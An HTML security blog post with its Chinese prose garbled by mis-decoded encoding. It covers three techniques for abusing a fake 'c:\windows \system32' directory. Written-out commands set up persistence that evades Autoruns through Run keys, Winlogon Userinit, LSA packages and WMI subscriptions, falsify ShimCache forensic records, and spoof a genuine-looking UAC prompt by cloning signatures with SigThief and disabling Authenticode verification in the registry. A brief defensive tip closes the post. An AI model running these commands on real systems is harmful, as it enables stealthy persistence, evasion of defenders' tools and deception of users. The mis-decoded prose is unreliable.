I"ß7<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¸Šç¯‡æ–‡ç« <a href="https://3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">ã€Šé€šè¿‡æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡UACçš„åˆ©ç”¨åˆ†æã€‹</a>å¯¹é€šè¿‡æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡UACçš„æ–¹æ³•è¿›è¡Œäº†åˆ†æï¼Œæœ¬æ–‡å°†ç»“åˆè‡ªå·±çš„ç»éªŒï¼Œç»§ç»­ä»‹ç»æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•çš„å¦å¤–ä¸‰ç§åˆ©ç”¨æŠ€å·§ï¼Œæœ€åç»™å‡ºé˜²å¾¡å»ºè®®</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡Autoruns</li>
  <li>åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•æ¬ºéª—ShimCache</li>
  <li>åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ä¼ªé€ æ­£å¸¸çš„UACå¼¹æ¡†</li>
</ul>

<h2 id="0x02-åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡autoruns">0x02 åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡Autoruns</h2>
<hr />

<p>ç»•è¿‡åŸç†ï¼š</p>

<p>Autorunsé»˜è®¤ä¸æ˜¾ç¤ºå¸¦æœ‰å¾®è½¯ç­¾åçš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶åŒ…å«å¾®è½¯ç­¾åï¼Œé»˜è®¤ä¸ä¼šæ˜¾ç¤ºåœ¨Autorunsé¢æ¿</p>

<p>åœ¨Windowsç³»ç»Ÿçš„å¯åŠ¨ä½ç½®å†™å…¥æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç”±äºè¢«è¯†åˆ«ä¸ºæ­£å¸¸å¸¦æœ‰å¾®è½¯ç­¾åçš„æ–‡ä»¶ï¼Œé»˜è®¤å°†ä¸ä¼šæ˜¾ç¤ºåœ¨Autorunsé¢æ¿</p>

<p>ç»è¿‡æµ‹è¯•ï¼Œå¹¶ä¸é€‚ç”¨äºæ‰€æœ‰çš„å¯åŠ¨ä½ç½®ï¼Œå…·ä½“æµ‹è¯•å¦‚ä¸‹ï¼š</p>

<p>åˆ›å»ºæ¨¡æ‹Ÿçš„å¯ä¿¡ç›®å½•ï¼Œæ·»åŠ æµ‹è¯•æ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
md "\\?\c:\windows \system32"
copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
copy c:\test\calc.dll "\\?\c:\windows \system32\atl.dll"
</code></pre></div></div>

<h3 id="1æ³¨å†Œå¯åŠ¨é¡¹hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun">1ã€æ³¨å†Œå¯åŠ¨é¡¹<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></h3>

<p>ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨æ–‡ä»¶<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>ï¼Œæ·»åŠ æ³¨å†Œè¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RunTest /t REG_SZ /d "\"c:\windows \system32\notepad.exe\""
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">"</code>åœ¨cmdä¸‹è½¬ä¹‰åç”¨<code class="language-plaintext highlighter-rouge">\"</code>è¡¨ç¤º</p>

<p>Autorunsæ£€æµ‹æ³¨å†Œè¡¨é¡¹ï¼Œå°†å…¶è¯†åˆ«ä¸ºnotepad.exeï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-1.png" alt="Alt text" /></p>

<p>ä½†åœ¨ç³»ç»Ÿå¼€æœºæ—¶å¯åŠ¨çš„æ˜¯æ­£å¸¸notepad.exeï¼Œè€Œä¸æ˜¯putty.exeï¼Œå¤±è´¥</p>

<h3 id="2æ³¨å†Œå¯åŠ¨é¡¹hkey_local_machinesoftwaremicrosoftwindows-ntcurrentversionwinlogonä¸‹çš„userinit">2ã€æ³¨å†Œå¯åŠ¨é¡¹<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>ä¸‹çš„<code class="language-plaintext highlighter-rouge">Userinit</code></h3>

<p>æŸ¥è¯¢åŸæ³¨å†Œè¡¨é¡¹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
</code></pre></div></div>

<p>é»˜è®¤é”®å€¼å†…å®¹ä¸ºï¼š<code class="language-plaintext highlighter-rouge">C:\Windows\system32\userinit.exe,</code></p>

<p>ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨æ–‡ä»¶<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>ï¼Œæ·»åŠ æ³¨å†Œè¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,\"c:\windows \system32\notepad.exe\"," /f
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">"</code>åœ¨cmdä¸‹è½¬ä¹‰åç”¨<code class="language-plaintext highlighter-rouge">\"</code>è¡¨ç¤º</p>

<p>ç³»ç»Ÿå¼€æœºæ—¶å¯åŠ¨putty.exeï¼ŒAutorunsæ£€æµ‹æ³¨å†Œè¡¨é¡¹ï¼Œå°†å…¶è¯†åˆ«ä¸ºnotepad.exeï¼ŒæˆåŠŸç»•è¿‡</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-2.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>Autorunsé»˜è®¤ä¸æ˜¾ç¤ºå¸¦æœ‰å¾®è½¯ç­¾åçš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ä¼šæ˜¾ç¤ºä¸Šå›¾ä¸­çš„notepad.exeï¼Œä¸Šå›¾ä¸ºäº†æ¼”ç¤ºä¸“é—¨è®¾ç½®ä¸ºæ˜¾ç¤ºæ‰€æœ‰å¯åŠ¨é¡¹</p>

<h3 id="3lsa-providers">3ã€LSA Providers</h3>

<p>æ³¨å†Œå¯åŠ¨é¡¹<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>ä¸‹çš„<code class="language-plaintext highlighter-rouge">Security Packages</code></p>

<p>æ·»åŠ é”®å€¼<code class="language-plaintext highlighter-rouge">"c:\windows \system32\atl.dll"</code></p>

<p>Autorunsæ£€æµ‹æ³¨å†Œè¡¨é¡¹ï¼Œå°†å…¶è¯†åˆ«ä¸ºatl.dllï¼ŒæˆåŠŸç»•è¿‡</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-4.png" alt="Alt text" /></p>

<h3 id="4wmi">4ã€WMI</h3>

<p>æ¯éš”60ç§’å¯åŠ¨æ–‡ä»¶<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>ï¼Œæ·»åŠ wmiçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows \System32\notepad.exe",CommandLineTemplate="C:\Windows \System32\notepad.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
</code></pre></div></div>

<p>æ‰§è¡Œåæ¯éš”ä¸€åˆ†é’Ÿå¯åŠ¨putty.exeï¼ŒAutorunsæ£€æµ‹æ³¨å†Œè¡¨é¡¹ï¼Œå°†å…¶è¯†åˆ«ä¸ºnotepad.exeï¼ŒæˆåŠŸç»•è¿‡</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-3.png" alt="Alt text" /></p>

<p>è¡¥å……ï¼š</p>

<p>æŸ¥çœ‹å·²æ³¨å†Œwmiä¿¡æ¯çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list
</code></pre></div></div>

<p>åˆ é™¤å·²æ³¨å†Œwmiçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE
</code></pre></div></div>

<h2 id="0x03-åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•æ¬ºéª—shimcache">0x03 åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•æ¬ºéª—ShimCache</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4">ã€Šæ¸—é€æŠ€å·§â€”â€”Windowsç³»ç»Ÿæ–‡ä»¶æ‰§è¡Œè®°å½•çš„è·å–ä¸æ¸…é™¤ã€‹</a>æåˆ°ï¼š</p>

<p>ShimCacheä¸ä»…ä¼šè®°å½•exeæ–‡ä»¶çš„æ‰§è¡Œï¼Œè€Œä¸”ä¼šå¯¹exeæ–‡ä»¶åŒçº§ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡Œè®°å½•(å¦‚æœæ–‡ä»¶æ²¡æœ‰æ‰§è¡Œï¼Œé‚£ä¹ˆExecutedçš„å±æ€§ä¸ºno)</p>

<p>ShimCacheåªä¼šåœ¨ç³»ç»Ÿé‡æ–°å¯åŠ¨åæ›´æ–°(æ³¨é”€å½“å‰ç”¨æˆ·ä¸ä¼šæ›´æ–°)</p>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæƒ³è¦æ¸…é™¤æœ¬æ¬¡ç³»ç»Ÿä»å¯åŠ¨è‡³å…³æœºçš„ShimCacheè®°å½•ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>

<p><strong>(1)ä¿®æ”¹æ³¨å†Œè¡¨</strong></p>

<p>å¤‡ä»½å½“å‰æ³¨å†Œè¡¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
</code></pre></div></div>

<p>ç³»ç»Ÿé‡å¯åï¼Œæ¢å¤æ³¨å†Œè¡¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg import ShimCache.reg
</code></pre></div></div>

<p><strong>(2)éæ­£å¸¸å…³æœº</strong></p>

<p>è·³è¿‡å†™å…¥æ³¨å†Œè¡¨çš„æ“ä½œï¼Œæ— æ³•è®°å½•æœ¬æ¬¡ç³»ç»Ÿè‡ªå¯åŠ¨è‡³å…³æœºçš„è®°å½•</p>

<p><strong>(3)ä¿®æ”¹å†…å­˜</strong></p>

<p>(ç†è®ºä¸Šå¯è¡Œ)</p>

<p>è¿™é‡Œæˆ‘å°è¯•åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•æ¬ºéª—ShimCacheï¼Œè¿·æƒ‘æ€§å¾ˆé«˜</p>

<p>æ–¹æ³•å¦‚ä¸‹ï¼š</p>

<h4 id="1-åˆ›å»ºå¯ä¿¡ç›®å½•cwindows-system32">1. åˆ›å»ºå¯ä¿¡ç›®å½•<code class="language-plaintext highlighter-rouge">"c:\windows \system32"</code></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
md "\\?\c:\windows \system32"
</code></pre></div></div>

<h4 id="2-é‡Šæ”¾æ–‡ä»¶cwindows-system32calcexe">2. é‡Šæ”¾æ–‡ä»¶<code class="language-plaintext highlighter-rouge">"c:\windows \system32\calc.exe"</code></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
</code></pre></div></div>

<h4 id="3-æ‰§è¡Œ">3. æ‰§è¡Œ</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"c:\windows \system32\notepad.exe"
</code></pre></div></div>

<h4 id="4-é‡å¯åæŸ¥çœ‹shimcache">4. é‡å¯åæŸ¥çœ‹ShimCache</h4>

<p>ä½¿ç”¨å·¥å…·ï¼š https://github.com/mandiant/ShimCacheParser</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
ShimCacheParser.py -o out.csv -r c:\test\ShimCache.reg -t
</code></pre></div></div>

<p>æŸ¥çœ‹ç»“æœï¼Œå¾ˆå…·æœ‰è¿·æƒ‘æ€§ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/3-1.png" alt="Alt text" /></p>

<h2 id="0x04-åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ä¼ªé€ æ­£å¸¸çš„uacå¼¹æ¡†">0x04 åˆ©ç”¨æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ä¼ªé€ æ­£å¸¸çš„UACå¼¹æ¡†</h2>
<hr />

<h3 id="1ç¼–å†™éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œçš„ç¨‹åº">1ã€ç¼–å†™éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œçš„ç¨‹åº</h3>

<p>ä½¿ç”¨Visual Studio</p>

<p>VSå·¥ç¨‹è®¾ç½®ä½ç½®ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">é…ç½®å±æ€§</code> -&gt; <code class="language-plaintext highlighter-rouge">é“¾æ¥å™¨</code> -&gt; <code class="language-plaintext highlighter-rouge">æ¸…å•æ–‡ä»¶</code>ï¼Œé€‰æ‹©éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œ</p>

<p>ä¹Ÿå¯ä»¥ä¿®æ”¹PEæ–‡ä»¶èµ„æºä¸­çš„manifest</p>

<h3 id="2æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•é‡Šæ”¾æ–‡ä»¶">2ã€æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ï¼Œé‡Šæ”¾æ–‡ä»¶</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy c:\test\testuac.exe "\\?\c:\windows \system32\diskpart.exe"
</code></pre></div></div>

<p>æ‰§è¡Œï¼š<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code></p>

<p>å¼¹å‡ºUACæç¤ºï¼Œæ˜¾ç¤ºè·¯å¾„ä¸ºæ­£å¸¸çš„diskpart.exeï¼Œä½†æ˜¯æ²¡æœ‰ç­¾åä¼šæç¤ºå¼‚å¸¸ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-1.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ‰§è¡Œæ­£å¸¸çš„diskpart.exeï¼ŒUACæç¤ºå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-2.png" alt="Alt text" /></p>

<p>ä¸ºäº†ä¼ªé€ æˆçœŸæ­£çš„UACæç¤ºï¼Œå¯ä»¥ä½¿ç”¨PEæ–‡ä»¶çš„Authenticodeç­¾åä¼ªé€ </p>

<p>å‚è€ƒèµ„æ–™ï¼š <a href="https://3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81">ã€ŠAuthenticodeç­¾åä¼ªé€ â€”â€”PEæ–‡ä»¶çš„ç­¾åä¼ªé€ ä¸ç­¾åéªŒè¯åŠ«æŒã€‹</a></p>

<h3 id="3ç­¾åä¼ªé€ ">3ã€ç­¾åä¼ªé€ </h3>

<p>ä½¿ç”¨SigThiefï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/secretsquirrel/SigThief</p>

<p>å‚æ•°å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i C:\Windows\System32\consent.exe -t c:\test\testuac.exe -o c:\test\new.exe 
copy c:\test\new.exe "\\?\c:\windows \system32\diskpart.exe" /y
</code></pre></div></div>

<h3 id="4ç»•è¿‡è¯ä¹¦éªŒè¯">4ã€ç»•è¿‡è¯ä¹¦éªŒè¯</h3>

<p>æ·»åŠ æ³¨å†Œè¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
</code></pre></div></div>

<p>5ã€æœ€ç»ˆæµ‹è¯•</p>

<p>å†æ¬¡æ‰§è¡Œï¼š<code class="language-plaintext highlighter-rouge">"c:\windows \system32\diskpart.exe"</code>ï¼ŒUACæç¤ºåŒçœŸæ­£çš„diskpart.exeä¸€æ ·ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/4-3.png" alt="Alt text" /></p>

<h2 id="0x05-é˜²å¾¡å»ºè®®">0x05 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>å¯¹äºæ¨¡æ‹Ÿå¯ä¿¡ç›®å½•çš„åˆ©ç”¨ï¼Œå‰ææ˜¯åˆ›å»ºäº†ä¼ªé€ çš„ç›®å½•ï¼Œæ‰€ä»¥å¯é€‰æ‹©å¯¹æ–‡ä»¶å¤¹çš„çŸ­æ–‡ä»¶åè¿›è¡Œç›‘æ§</p>

<p>å¦‚æœå‡ºç°ä¸ç³»ç»Ÿç›®å½•ç›¸è¿‘çš„çŸ­æ–‡ä»¶åï¼Œå¯é€‰æ‹©è¿›è¡Œæ ‡è®°</p>

<p>æŸ¥çœ‹çŸ­æ–‡ä»¶åçš„æ–¹æ³•ï¼š  <code class="language-plaintext highlighter-rouge">dir /x</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/5-1.png" alt="Alt text" /></p>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•çš„å¦å¤–ä¸‰ç§åˆ©ç”¨æŠ€å·§ï¼Œæœ€åç»™å‡ºé˜²å¾¡å»ºè®®</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET